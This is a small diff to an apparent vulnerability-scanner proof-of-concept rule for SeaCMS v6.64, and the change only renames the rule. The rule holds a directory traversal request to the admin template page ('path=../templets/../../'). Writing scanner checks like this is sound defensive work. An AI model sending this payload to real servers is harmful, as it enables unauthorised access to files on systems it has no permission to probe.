@@ -1,4 +1,4 @@
-name: poc-yaml-seacms-v664-dir.yml
+name: poc-yaml-seacms-v664-dir
 rules:
   - method: GET
     path: /adm/admin_template.php?path=../templets/../../
